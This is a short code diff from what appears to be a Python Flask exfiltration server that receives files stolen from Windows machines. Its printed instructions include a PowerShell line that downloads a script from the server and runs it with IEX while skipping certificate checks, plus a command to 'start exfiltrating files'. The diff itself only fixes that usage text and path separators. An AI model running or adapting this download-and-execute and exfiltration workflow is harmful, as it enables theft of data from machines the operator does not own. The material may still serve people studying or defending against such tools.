@@ -289,7 +289,7 @@ def main():
           "Load into PowerShell via Invoke-WebRequest:\n"
           f"PS > IWR -SkipCertificateCheck '{target_url}iwe' | IEX \n")
     print("Start exfiltrating files with:\n"
-          "PS > ls * | IEX\n")
+          "PS > ls * | IWE\n")
 
     app = Flask(__name__)
     iwe = IWE(password=args.password)
@@ -311,7 +311,7 @@ def main():
         except TypeError:
             return Response('Error: The received JSON body looks wrong', status=200)
 
-        dirs = os.path.dirname(file_full_path).replace(':', '')
+        dirs = os.path.dirname(file_full_path).replace(':', '').replace('\\', '/')
         filename = os.path.basename(file_full_path)
 
         system_ident = ''.join(char for char in system_info if char not in ';:/\\*?><|')
